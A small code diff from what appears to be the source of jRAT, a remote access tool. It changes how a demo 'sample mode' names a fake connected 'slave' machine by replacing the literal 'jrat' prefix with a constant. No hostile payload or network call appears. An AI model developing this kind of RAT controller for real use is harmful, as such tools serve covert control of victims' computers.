@@ -43,7 +43,7 @@ public class SampleMode {
 			ConnectionHandler.addSlave(slave);
 			slave.setOperatingSystem(os);
 			slave.setStatus(5);
-			slave.setServerID("jrat" + new Random().nextInt(1000));
+			slave.setServerID(Constants.NAME + new Random().nextInt(1000));
 			slave.setComputerName("Sample");
 			slave.setUsername("Sample");
 		}
